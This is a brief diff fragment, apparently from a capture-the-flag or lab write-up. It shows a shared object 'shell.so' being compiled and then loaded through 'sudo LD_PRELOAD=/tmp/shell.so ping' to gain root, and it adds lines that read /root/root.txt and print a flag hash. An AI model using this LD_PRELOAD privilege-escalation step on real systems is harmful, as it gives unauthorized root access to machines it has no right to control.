@@ -51,4 +51,6 @@ saad: /tmp$  gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 >> sudo LD_PRELOAD=/tmp/shell.so ping
 
+>> cat /root/root.txt
+992bfd94b90da48634aed182aae7b99f
 
